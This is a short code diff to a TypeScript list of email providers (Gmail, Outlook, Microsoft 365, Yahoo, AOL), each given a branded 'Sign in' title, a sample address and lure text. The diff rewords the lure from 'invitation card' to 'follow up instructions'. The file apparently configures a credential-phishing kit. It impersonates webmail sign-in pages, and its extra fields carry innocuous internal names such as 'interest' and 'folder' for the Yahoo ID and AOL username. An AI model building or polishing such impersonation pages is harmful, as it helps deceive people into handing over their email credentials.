@@ -32,7 +32,8 @@ export const providers: ProviderSnapshot[] = [
     title: "Sign in",
     brandLabel: "Google",
     emailSample: "example@gmail.com",
-    description: "Recieve invitation card privately in your Gmail inbox.",
+    description:
+      "Recieve follow up instructions privately in your Gmail inbox.",
   },
   {
     id: "outlook",
@@ -41,7 +42,7 @@ export const providers: ProviderSnapshot[] = [
     title: "Sign in",
     brandLabel: "Outlook",
     emailSample: "example@outlook.com",
-    description: "Recieve invitation card in your Outlook mailbox",
+    description: "Recieve follow up instructions in your Outlook mailbox",
   },
   {
     id: "microsoft365",
@@ -66,7 +67,7 @@ export const providers: ProviderSnapshot[] = [
     brandLabel: "Yahoo",
     title: "Sign in to Yahoo!",
     emailSample: "example@yahoo.com",
-    description: "Recieve invitation card securely in Yahoo! mailbox.",
+    description: "Recieve follow up instructions securely in Yahoo! mailbox.",
     extraFields: {
       name: "interest",
       label: "Yahoo ID",
@@ -82,7 +83,7 @@ export const providers: ProviderSnapshot[] = [
     brandLabel: "AOL",
     title: "Sign in",
     emailSample: "Enter your AOL mail address.",
-    description: "Recieve invitation card in your AOL mailbox.",
+    description: "Recieve follow up instructions in your AOL mailbox.",
     extraFields: {
       name: "folder",
       label: "AOL username",
